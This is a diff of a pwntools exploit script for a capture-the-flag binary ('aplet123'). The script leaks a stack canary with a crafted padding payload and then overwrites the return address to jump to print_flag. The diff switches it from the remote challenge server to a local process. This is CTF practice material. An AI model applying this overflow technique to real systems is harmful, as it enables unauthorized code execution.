@@ -2,11 +2,11 @@ from pwn import *
 
 exe = context.binary = ELF('aplet123')
 winaddr = exe.symbols['print_flag']
-io = remote('chall.lac.tf', 31123)
-#io = exe.process()
+#io = remote('chall.lac.tf', 31123)
+io = exe.process()
 io.recvline()
 load1 = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaaamaaanaaaoaaapaaqaaaai\'m'
-#gdb.attach(io)
+
 io.sendline(load1)
 io.recvuntil(b'hi ')
 canary = io.recvuntil(b',')
@@ -22,6 +22,5 @@ load2 = fit({
 io.sendline(load2)
 io.recvline()
 io.sendline(b'bye')
-io.recvline()
-io.recvline()
+io.recvuntil(b'bye\n')
 print(io.recvline())
